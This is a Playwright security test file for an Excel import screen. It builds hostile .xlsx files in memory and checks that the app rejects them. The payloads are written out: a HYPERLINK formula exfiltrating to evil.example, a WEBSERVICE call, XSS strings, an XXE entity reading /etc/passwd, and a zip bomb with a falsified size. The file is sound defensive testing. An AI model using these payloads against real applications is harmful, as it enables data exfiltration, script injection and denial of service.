import { test, expect } from '@playwright/test';
import { deflateRawSync } from 'node:zlib';
import { instrument, cspViolations, login, requireSupabase } from './_helpers.js';
import { crc32, listZipEntries, readFirstSheet } from '../../engine/index.js';

// V-07 · categorías 3 y 4: importación de mediciones desde Excel .xlsx en la pantalla
// real #/custodio/mediciones (custodio2, indicador AVAIL), con DecompressionStream del
// navegador. Los .xlsx hostiles se fabrican aquí en memoria.
//
// Criterio: cada archivo hostil se rechaza con un mensaje en texto, el botón de guardar
// queda inactivo, no sale ninguna escritura a /rest/v1/measurements, no hay diálogos,
// ni violaciones de CSP, ni nodos inyectados, y la pestaña no se cuelga (zip bomb).
// La plantilla se descarga por blob: sin violar la CSP y es un .xlsx legible.

const NS = 'http://schemas.openxmlformats.org/spreadsheetml/2006/main';
const REL = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships';
const PREL = 'http://schemas.openxmlformats.org/package/2006/relationships';
const XLSX_MIME = 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet';

/** ZIP deflate; `size` permite mentir en el tamaño declarado de una parte. */
function zip(parts, lie = {}) {
  const locals = [];
  const cen = [];
  let off = 0;
  for (const [name, content] of Object.entries(parts)) {
    const data = typeof content === 'string' ? Buffer.from(content, 'utf8') : Buffer.from(content);
    const comp = deflateRawSync(data);
    const n = Buffer.from(name, 'utf8');
    const crc = crc32(new Uint8Array(data));
    const size = lie[name] ?? data.length;
    const loc = Buffer.alloc(30);
    loc.writeUInt32LE(0x04034b50, 0); loc.writeUInt16LE(20, 4); loc.writeUInt16LE(8, 8);
    loc.writeUInt32LE(crc, 14); loc.writeUInt32LE(comp.length, 18); loc.writeUInt32LE(size, 22); loc.writeUInt16LE(n.length, 26);
    const c = Buffer.alloc(46);
    c.writeUInt32LE(0x02014b50, 0); c.writeUInt16LE(20, 4); c.writeUInt16LE(20, 6); c.writeUInt16LE(8, 10);
    c.writeUInt32LE(crc, 16); c.writeUInt32LE(comp.length, 20); c.writeUInt32LE(size, 24); c.writeUInt16LE(n.length, 28);
    c.writeUInt32LE(off, 42);
    locals.push(loc, n, comp);
    cen.push(c, n);
    off += 30 + n.length + comp.length;
  }
  const cd = Buffer.concat(cen);
  const e = Buffer.alloc(22);
  const k = Object.keys(parts).length;
  e.writeUInt32LE(0x06054b50, 0); e.writeUInt16LE(k, 8); e.writeUInt16LE(k, 10);
  e.writeUInt32LE(cd.length, 12); e.writeUInt32LE(off, 16);
  return Buffer.concat([...locals, cd, e]);
}

const esc = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;');
const cell = (v) => (typeof v === 'object' ? v.raw : `<c t="inlineStr"><is><t>${esc(v)}</t></is></c>`);
const sheet = (rows) => `<worksheet xmlns="${NS}"><sheetData>${rows.map((r, i) => `<row r="${i + 1}">${r.map(cell).join('')}</row>`).join('')}</sheetData></worksheet>`;
function book(sheetXml, lie) {
  return zip({
    '_rels/.rels': `<Relationships xmlns="${PREL}"><Relationship Id="rId1" Type="${REL}/officeDocument" Target="xl/workbook.xml"/></Relationships>`,
    'xl/workbook.xml': `<workbook xmlns="${NS}" xmlns:r="${REL}"><sheets><sheet name="M" sheetId="1" r:id="rId1"/></sheets></workbook>`,
    'xl/_rels/workbook.xml.rels': `<Relationships xmlns="${PREL}"><Relationship Id="rId1" Type="${REL}/worksheet" Target="worksheets/sheet1.xml"/></Relationships>`,
    'xl/worksheets/sheet1.xml': sheetXml,
  }, lie);
}
const HEAD = ['fecha', 'unidad', 'valor'];
const OK = ['2026-01-15', 'Unidad Alfa', '99.95'];

const CASES = [
  ['fórmula en texto (=HYPERLINK)', book(sheet([HEAD, OK, ['2026-01-16', 'Unidad Alfa', '=HYPERLINK("https://evil.example/?d="&A1,"ver")']])), /posible fórmula/],
  ['celda con <f> y valor cacheado válido', book(sheet([HEAD, OK, ['2026-01-16', 'Unidad Alfa', { raw: '<c><f>WEBSERVICE("http://evil.example/")</f><v>99.9</v></c>' }]])), /fórmula/],
  ['XSS almacenable en unidad', book(sheet([HEAD, OK, ['2026-01-16', '<img src=x onerror=alert(1)>', '99.9']])), /no existe/],
  ['XSS en cabecera', book(sheet([[...HEAD, '<svg onload=alert(1)>'], [...OK, 'x']])), /no reconocidas/],
  ['DOCTYPE / XXE', book(`<!DOCTYPE w [<!ENTITY x SYSTEM "file:///etc/passwd">]>${sheet([HEAD, ['&x;', 'Unidad Alfa', '1']])}`), /DOCTYPE/],
  ['zip bomb con tamaño falso (96 MiB declarados como 2 KB)', book(Buffer.alloc(96 * 1024 * 1024), { 'xl/worksheets/sheet1.xml': 2048 }), /demasiado grande/],
];

test.beforeEach(() => requireSupabase(test));

for (const [name, bytes, re] of CASES) {
  test(`Excel (V-07): ${name} → rechazado, sin escrituras ni ejecución`, async ({ page }) => {
    expect(bytes.length, 'cabe en 1 MB').toBeLessThan(1024 * 1024);
    const seen = await instrument(page);
    const writes = [];
    page.on('request', (r) => {
      if (/\/rest\/v1\/measurements/.test(r.url()) && r.method() !== 'GET') writes.push(`${r.method()} ${r.url()}`);
      if (/evil\.example|169\.254\./.test(r.url())) writes.push(`EXFIL ${r.url()}`);
    });

    await login(page, 'custodio2@example.test');
    await page.goto('./#/custodio/mediciones');
    await page.getByLabel('Indicador').selectOption({ label: 'AVAIL · Disponibilidad' });
    await page.getByLabel('Archivo CSV o Excel (.xlsx)').setInputFiles({ name: 'mediciones.xlsx', mimeType: XLSX_MIME, buffer: bytes });

    const errors = page.locator('.csv-errors');
    await expect(errors).toBeVisible({ timeout: 20000 });
    await expect(errors).toContainText('no se guardó nada');
    await expect(errors).toContainText(re);
    await expect(page.locator('.csv-ok')).toHaveCount(0);
    const save = page.getByRole('button', { name: /Guardar .*mediciones/ });
    await expect(save).toBeDisabled();
    await save.click({ force: true, timeout: 2000 }).catch(() => {});
    await page.waitForTimeout(300);

    expect(writes, 'escrituras o salidas a terceros').toEqual([]);
    expect(seen.dialogs).toEqual([]);
    expect(await cspViolations(page)).toEqual([]);
    expect(await page.locator('.csv-errors a, .csv-errors img, .csv-errors svg, .csv-errors script').count()).toBe(0);
    // La pestaña sigue respondiendo tras el archivo hostil.
    expect(await page.evaluate(() => 1 + 1)).toBe(2);
  });
}

test('Plantilla Excel (V-07): se descarga por blob: sin violar la CSP y es un .xlsx sin fórmulas ni enlaces externos', async ({ page }) => {
  const seen = await instrument(page);
  await login(page, 'custodio2@example.test');
  await page.goto('./#/custodio/mediciones');
  await page.getByLabel('Indicador').selectOption({ label: 'AVAIL · Disponibilidad' });
  const [download] = await Promise.all([
    page.waitForEvent('download'),
    page.getByRole('button', { name: 'Descargar plantilla Excel (.xlsx)' }).click(),
  ]);
  expect(download.suggestedFilename()).toMatch(/^plantilla-mediciones-[a-z_]+\.xlsx$/);
  expect(download.url()).toMatch(/^blob:http:\/\/(127\.0\.0\.1|localhost)(:\d+)?\//);
  const chunks = [];
  for await (const c of await download.createReadStream()) chunks.push(c);
  const bytes = new Uint8Array(Buffer.concat(chunks));
  const entries = listZipEntries(bytes);
  for (const name of entries.keys()) expect(name).not.toMatch(/vba|external|oleObject|\.\./i);
  const { rows } = await readFirstSheet(bytes, async (d) => d);
  expect(rows[0].cells.map((c) => c.value)).toEqual(['fecha', 'unidad', 'valor']);
  expect(seen.dialogs).toEqual([]);
  expect(await cspViolations(page)).toEqual([]);
});
